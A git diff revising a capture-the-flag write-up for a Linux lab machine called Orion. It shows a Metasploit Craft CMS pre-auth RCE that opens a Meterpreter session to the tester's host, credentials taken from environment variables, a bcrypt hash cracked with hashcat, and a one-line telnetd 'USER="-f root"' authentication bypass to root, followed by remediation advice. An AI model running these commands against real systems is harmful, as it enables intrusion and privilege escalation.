@@ -1,31 +1,31 @@
-
-| Property         | Value                         |
-| ---------------- | ----------------------------- |
-| **OS**           | Linux / Windows               |
-| **Difficulty**   | Easy / Medium / Hard / Insane |
-| **Release Date** | YYYY-MM-DD                    |
-| **State**        | YYYY-MM-DD                    |
-| **IP**           | 10.10.10.X                    |
-| **Techniques**   | technique-1, technique-2      |
-| **Tags**         | #web #privesc #linux          |
+|Property|Value|
+|---|---|
+|**OS**|Linux|
+|**Difficulty**|Easy|
+|**Release Date**|2026-06-23|
+|**State**|Retired|
+|**IP**|10.129.35.17|
+|**Techniques**|PHP object injection RCE, hash cracking, telnet authentication bypass|
+|**Tags**|#web #privesc #linux|
 
 ---
 ## Summary
 
-Orion is an easy Linux machine hosting on port 80 Orion Telecom, a service which delivers secure, high-performance networks connecting government agencies, large corporations, and critical services. Directory fuzzing reveals an admin endpoint, which presents a login form. At the bottom of the page is displayed the vulnerable version 5.6.16 of CraftCMS. The vulerability leverages an unauthenticated remote code execution through php deserialization which allows to gain a shell on the target as www-data. Enviromental variables display credentials for a mysql database, which stores the hashed credentials of the user adam. The hash can be cracked against roockyou.txt and consequentely allows SSH access as adam. Open ports enumeration reveals an internal telnet service bound to loopback. Telnet is running version 2.7 which is vulerable to cve 2026-24061, a remote authentication bypass, which grants a shell as root.
+Orion is an easy Linux machine hosting Orion Telecom on port 80, a platform advertised as delivering secure, high-performance networks for government agencies, large corporations, and other critical infrastructure providers. Directory fuzzing discloses an admin endpoint backed by Craft CMS. Below the login form the running version is visible, 5.6.16. This version is vulnerable to CVE-2025-32432, an unauthenticated remote code execution via PHP object injection, which is exploited to obtain a shell as `www-data`. Environment variables expose plaintext credentials for the local MySQL database, which stores the bcrypt-hashed password of the administrative user `adam`. The hash is cracked against `rockyou.txt`, granting SSH access. Port enumeration reveals an internal Telnet service bound to loopback, running GNU Inetutils `telnetd` 2.7, which is vulnerable to CVE-2026-24061, a remote authentication bypass via the `USER` environment variable. Exploiting it grants a root shell.
 
 ---
 ## Enumeration
 
 ```
- echo '10.129.35.17 orion.htb' | sudo tee -a /etc/hosts
+echo '10.129.35.17 orion.htb' | sudo tee -a /etc/hosts
 ```
 
-Added the ip address of the machine to the /etc/hosts file.
+Added the IP address of the machine to the `/etc/hosts` file.
+
 ### Nmap Scan
 
 ```
- sudo nmap -sCV orion.htb                              
+sudo nmap -sCV orion.htb                              
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-27 06:51 EDT
 Nmap scan report for orion.htb (10.129.35.17)
 Host is up (0.034s latency).
@@ -41,17 +41,19 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds                                                                              
+Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
 ```
 
 ### Service Enumeration
 
+The web application on port 80 is the marketing site for Orion Telecom.
+
 ![](./screens/1.png)
 
-Exposed admin endpoint:
+**Exposed admin endpoint:**
 
 ```
- gobuster dir -u http://orion.htb -w /home/kali/SecLists/Discovery/Web-Content/raft-large-directories.txt
+gobuster dir -u http://orion.htb -w /home/kali/SecLists/Discovery/Web-Content/raft-large-directories.txt
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -79,28 +81,33 @@ Starting gobuster in directory enumeration mode
 Progress: 8069 / 62281 (12.96%)^C
 ```
 
+`/admin` redirects to a Craft CMS login form.
+
 **Vulnerable Craft CMS 5.6.16:**
-![](./screens/2.png)
+
+![](./screens/1.png)
 
 ---
+
 ## Foothold
 
 ### CVE-2025-32432
 
-Craft is a flexible, user-friendly CMS for creating custom digital experiences on the web and beyond. Starting from version 3.0.0-RC1 to before 3.9.15, 4.0.0-RC1 to before 4.14.15, and 5.0.0-RC1 to before 5.6.17, Craft is vulnerable to unauthenticated remote code execution. Attackers can inject custom PHP objects via the asset generation endpoints to execute arbitrary commands. This is a high-impact, low-complexity attack vector. This issue has been patched in versions 3.9.15, 4.14.15, and 5.6.17, and is an additional fix for CVE-2023-41892. 
+Craft is a flexible, user-friendly CMS for creating custom digital experiences on the web and beyond. Starting from version 3.0.0-RC1 to before 3.9.15, 4.0.0-RC1 to before 4.14.15, and 5.0.0-RC1 to before 5.6.17, Craft is vulnerable to unauthenticated remote code execution. Attackers can inject custom PHP objects via the asset generation endpoints to execute arbitrary commands. This is a high-impact, low-complexity attack vector. The issue has been patched in versions 3.9.15, 4.14.15, and 5.6.17, and is an additional fix for CVE-2023-41892.
 
-The vulnerability works and is exploited in the wild over vulnerable Craft CMS instances if a threat actor  follows: 
+The vulnerability is exploited in the wild against vulnerable Craft CMS instances as follows:
 
-- Sending a crafted GET request to _**/index.php?p=admin/dashboard**_ to retrieve a CSRF token from the CraftCMS admin dashboard. 
+- A crafted `GET` request to `/index.php?p=admin/dashboard` retrieves a CSRF token from the Craft CMS admin dashboard.
+- A `POST` request to `/index.php?p=admin/actions/assets/generate-transform` with a specially crafted JSON payload is sent, retrieving a valid asset ID through PHP object injection.
+- The payload includes a PHP object that gets deserialized, leading to arbitrary code execution through the `GuzzleHttp\Psr7\FnStream` class.
 
-- Sends a POST request to _**/index.php?p=admin/actions/assets/generate-transform**_ with a specially crafted JSON payload and retrieves a valid asset ID through PHP object injection. 
+Source: [SonicWall — CraftCMS Vulnerability Exposes Systems to Pre-Auth RCE (CVE-2025-32432)](https://www.sonicwall.com/it-it/blog/craftcms-vulnerability-exposes-systems-to-pre-auth-rce-now-exploited-in-the-wild-cve-2025-32432-)
 
-- The payload includes a PHP object that gets deserialized, leading to arbitrary code execution through the _**GuzzleHttp\Psr7\FnStream**_ class.
-
-Source: https://www.sonicwall.com/it-it/blog/craftcms-vulnerability-exposes-systems-to-pre-auth-rce-now-exploited-in-the-wild-cve-2025-32432-
 ### Exploitation
 
-PoC: https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/
+PoC: [Rapid7 — craftcms_preauth_rce_cve_2025_32432](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/)
+
+shell
 
 ```shell
 msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
@@ -150,14 +157,18 @@ msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
 [*] Sending stage (41224 bytes) to 10.129.35.17
 [*] Meterpreter session 1 opened (10.10.15.4:4444 -> 10.129.35.17:58740) at 2026-06-27 07:07:39 -0400
 
-meterpreter > 
-
+meterpreter >
 ```
 
----
-## User Flag
+A Meterpreter session is obtained as `www-data`.
 
-### Lateral Movement from www-data to adam:
+---
+
+## Lateral Movement
+
+### From www-data to adam
+
+Dropping to a shell and enumerating listening ports:
 
 ```
 meterpreter > shell
@@ -174,7 +185,12 @@ LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=10
 LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*                                                           
 LISTEN 0      10         127.0.0.1:23        0.0.0.0:*                                                           
 LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                                           
-LISTEN 0      128             [::]:22           [::]:*                                                           
+LISTEN 0      128             [::]:22           [::]:*
+```
+
+A local MySQL instance on port 3306 and an internal telnet service on port 23 are noted for later. Environment variables disclose plaintext Craft CMS database credentials:
+
+```
 www-data@orion:~/html/craft/web$ env
 env
 CRAFT_ENVIRONMENT=dev
@@ -197,11 +213,21 @@ CRAFT_DEV_MODE=true
 CRAFT_ALLOW_ADMIN_CHANGES=true
 CRAFT_DB_SCHEMA=
 _=/usr/bin/env
+```
+
+Upgrading to a full interactive TTY:
+
+```
 www-data@orion:~/html/craft/web$ which python3
 which python3
 /usr/bin/python3
 www-data@orion:~/html/craft/web$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 <eb$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Connecting to the database with the recovered `root` MySQL credentials:
+
+```
 www-data@orion:~/html/craft/web$ mysql -u root -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion
 <oot -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion
 Reading table information for completion of table and column names
@@ -251,7 +277,7 @@ show tables;
 | craftidtokens              |
 | deprecationerrors          |
 | drafts                     |
-| elementactivity            |
+| elementactivity             |
 | elements                   |
 | elements_bulkops           |
 | elements_owners            |
@@ -284,7 +310,7 @@ show tables;
 | shunnedmessages            |
 | sitegroups                 |
 | sites                      |
-| sso_identities             |
+| sso_identities              |
 | structureelements          |
 | structures                 |
 | systemmessages             |
@@ -314,21 +340,21 @@ select * from users;
 +----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
 1 row in set (0.001 sec)
 
-MariaDB [orion]> 
-
+MariaDB [orion]>
 ```
+
+The `users` table maps a single admin account, `adam@orion.htb`, to a bcrypt password hash. A `/home` listing confirms a matching local user:
 
 ```
 www-data@orion:~/html/craft/web$ ls /home
 ls /home
 adam
-
 ```
 
-hash cracking
+### Hash Cracking
 
 ```
- hashcat -m 3200 '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'  /usr/share/wordlists/rockyou.txt
+hashcat -m 3200 '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'  /usr/share/wordlists/rockyou.txt
 hashcat (v7.1.2) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -359,93 +385,40 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-Cracking performance lower than expected?                 
-
-* Append -w 3 to the commandline.
-  This can cause your screen to lag.
-
-* Append -S to the commandline.
-  This has a drastic speed impact but can be better for specific attacks.
-  Typical scenarios are a small wordlist but a large ruleset.
-
-* Update your backend API runtime / driver the right way:
-  https://hashcat.net/faq/wrongdriver
-
-* Create more work items to make use of your parallelization power:
-  https://hashcat.net/faq/morework
-
 $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
-                                                          
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
-Hash.Target......: $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/...LUg0lS
 Time.Started.....: Sat Jun 27 07:20:19 2026 (1 min, 31 secs)
-Time.Estimated...: Sat Jun 27 07:21:50 2026 (0 secs)
-Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#01........:        7 H/s (8.29ms) @ Accel:4 Loops:32 Thr:1 Vec:1
 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
-Progress.........: 656/14344385 (0.00%)
-Rejected.........: 0/656 (0.00%)
-Restore.Point....: 640/14344385 (0.00%)
-Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:8160-8192
-Candidate.Engine.: Device Generator
-Candidates.#01...: sunshine1 -> sweetpea
-Hardware.Mon.#01.: Util: 87%
-
-Started: Sat Jun 27 07:20:13 2026
-Stopped: Sat Jun 27 07:21:51 2026
-                                                                                                                                        
 ```
 
 Credentials recovered: `adam:darkangel`
 
-## User flag
+---
+
+## User Flag
 
 ```
 ssh adam@orion.htb                                     
 adam@orion.htb's password: 
-Permission denied, please try again.
-adam@orion.htb's password: 
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Sat Jun 27 12:01:04 PM UTC 2026
-
-  System load:  0.0               Processes:             226
-  Usage of /:   78.1% of 5.81GB   Users logged in:       0
-  Memory usage: 10%               IPv4 address for eth0: 10.129.35.17
-  Swap usage:   0%
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-2 additional security updates can be applied with ESM Apps.
-Learn more about enabling ESM Apps service at https://ubuntu.com/esm
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
 
 adam@orion:~$ ls
 user.txt
 adam@orion:~$ cat user.txt
-c0a41a68366368ce471497e553646536
-(censor)
+c0a*************************536
 ```
+
 ---
+
 ## Privilege Escalation
 
 ### Enumeration
 
-Active listening TCP ports enumeration reveals a telnet service running on port 23 (default telnet TCP port):
+Active listening TCP ports confirm an internal telnet service on port 23 (the default telnet port):
+
 ```
 adam@orion:~$ ss -tlpn
 State                      Recv-Q                     Send-Q                                         Local Address:Port                                         Peer Address:Port                    Process                     
@@ -454,12 +427,12 @@ LISTEN                     0                          511                       
 LISTEN                     0                          80                                                 127.0.0.1:3306                                              0.0.0.0:*                                                   
 LISTEN                     0                          10                                                 127.0.0.1:23                                                0.0.0.0:*                                                   
 LISTEN                     0                          4096                                           127.0.0.53%lo:53                                                0.0.0.0:*                                                   
-LISTEN                     0                          128                                                     [::]:22                                                   [::]:* 
+LISTEN                     0                          128                                                     [::]:22                                                   [::]:*
 ```
 
-Vulnerable telnet version 2.7
+**Vulnerable telnet version 2.7:**
 
-```                                                  
+```
 adam@orion:~$ telnet --version
 telnet (GNU inetutils) 2.7
 Copyright (C) 2025 Free Software Foundation, Inc.
@@ -468,22 +441,23 @@ This is free software: you are free to change and redistribute it.
 There is NO WARRANTY, to the extent permitted by law.
 
 Written by many authors.
-adam@orion:~$ 
-
+adam@orion:~$
 ```
 
+### CVE-2026-24061
 
-telnetd in GNU Inetutils through 2.7 allows remote authentication bypass via a "-f root" value for the USER environment variable.
+`telnetd` in GNU Inetutils through 2.7 allows a remote authentication bypass via a `-f root` value supplied in the `USER` environment variable. Sending `USER=-f root` is interpreted by the login chain as:
 
-By sending `USER=-f root`, the value is interpreted as:
+- `-f`: skip authentication (trusted host)
+- `root`: target user to log in as
 
-- `-f` flag: Skip authentication (trusted host)
-- `root`: Target user
+This causes `login -f root` to be executed by the telnet daemon, granting immediate root access with no credentials required.
 
-This causes `login -f root` to be executed, granting immediate root access.
-### Exploitation CVE-2026-24061
+### Exploitation
 
-PoC: https://medium.com/@shivam_bathla/telnetd-auth-bypass-to-root-f6e239d692b5
+PoC: [Telnetd Auth Bypass to Root](https://medium.com/@shivam_bathla/telnetd-auth-bypass-to-root-f6e239d692b5)
+
+shell
 
 ```shell
 adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
@@ -495,10 +469,6 @@ Linux 5.15.0-177-generic (orion) (pts/3)
 
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
  System information as of Sat Jun 27 12:05:03 PM UTC 2026
 
   System load:  0.0               Processes:             231
@@ -506,38 +476,31 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
   Memory usage: 10%               IPv4 address for eth0: 10.129.35.17
   Swap usage:   0%
 
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-2 additional security updates can be applied with ESM Apps.
-Learn more about enabling ESM Apps service at https://ubuntu.com/esm
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-root@orion:~# 
+root@orion:~#
 ```
 
-## Root flag
+---
+
+## Root Flag
 
 ```
 root@orion:~# cat /root/root.txt
-8a40ae244433c71c6b174e4ea8fec4ef (censor)
+8a4*************************4ef
 ```
+
 ---
+
 ## Remediation
 
-- cve 2025 32432 : update craftcms to a patched version
-- plaintext database credentials stored in an enviromental variable
-- CVE-2026-24061 upgrade telnet to a patched version ((or replace with ssh))
+- **CVE-2025-32432:** Upgrade Craft CMS to a patched version (3.9.15, 4.14.15, 5.6.17, or later).
+- **Plaintext database credentials:** Avoid storing database credentials in plaintext environment variables readable by the application's own process. Use a secrets manager or restricted-permission secrets file instead.
+- **Weak credentials:** Enforce a strong password policy for application and system accounts to resist offline cracking against common wordlists.
+- **CVE-2026-24061:** Upgrade `telnetd` (GNU Inetutils) to a patched version, or — preferably — remove telnet entirely in favor of SSH, which does not suffer from this class of authentication bypass.
 
 ---
+
 ## References
 
-- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
-- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
+- [SonicWall — CraftCMS Vulnerability Exposes Systems to Pre-Auth RCE (CVE-2025-32432)](https://www.sonicwall.com/it-it/blog/craftcms-vulnerability-exposes-systems-to-pre-auth-rce-now-exploited-in-the-wild-cve-2025-32432-)
+- [Rapid7 — craftcms_preauth_rce_cve_2025_32432 Metasploit Module](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/)
+- [Telnetd Auth Bypass to Root](https://medium.com/@shivam_bathla/telnetd-auth-bypass-to-root-f6e239d692b5)
